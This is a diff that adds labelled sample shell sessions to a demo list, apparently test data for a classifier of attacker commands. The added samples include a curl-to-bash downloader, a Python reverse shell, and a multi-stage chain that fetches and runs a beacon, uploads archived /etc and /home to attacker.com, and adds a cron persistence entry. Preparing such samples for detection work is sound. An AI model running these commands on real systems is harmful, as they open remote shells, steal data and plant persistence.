@@ -113,6 +113,33 @@ DEMO_SESSIONS = [
                    "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArD...' > .ssh/authorized_keys; "
                    "chmod 600 .ssh/authorized_keys; chattr +ia .ssh",
         "expected": "Destructive"
+    },
+    {
+        "name": "Safe Admin Maintenance",
+        "commands": "apt update; apt list --upgradable; df -h; systemctl status ssh",
+        "expected": "Safe"
+    },
+    {
+        "name": "Recon + Privilege Enumeration",
+        "commands": "uname -a; id; getent passwd; find / -perm -4000 2>/dev/null | head -20",
+        "expected": "Recon"
+    },
+    {
+        "name": "Downloader via curl|bash",
+        "commands": "curl -fsSL http://198.51.100.12/install.sh | bash; systemctl enable updater",
+        "expected": "Downloader"
+    },
+    {
+        "name": "Python Reverse Shell Exploit",
+        "commands": "python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((\"192.168.1.100\",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); subprocess.call([\"/bin/bash\",\"-i\"])'",
+        "expected": "Exploit"
+    },
+    {
+        "name": "Persistence + Exfiltration Multi-Stage APT",
+        "commands": "wget http://10.0.0.5/beacon.elf -O /tmp/beacon; chmod +x /tmp/beacon; /tmp/beacon; "
+                   "tar czf /tmp/sensitive_data.tgz /etc /home; curl -X POST http://attacker.com/upload -d @/tmp/sensitive_data.tgz; "
+                   "echo '* * * * * /tmp/beacon --persist' >> /var/spool/cron/root; chattr +i /tmp/beacon",
+        "expected": "ADVANCED_APT"
     }
 ]
 
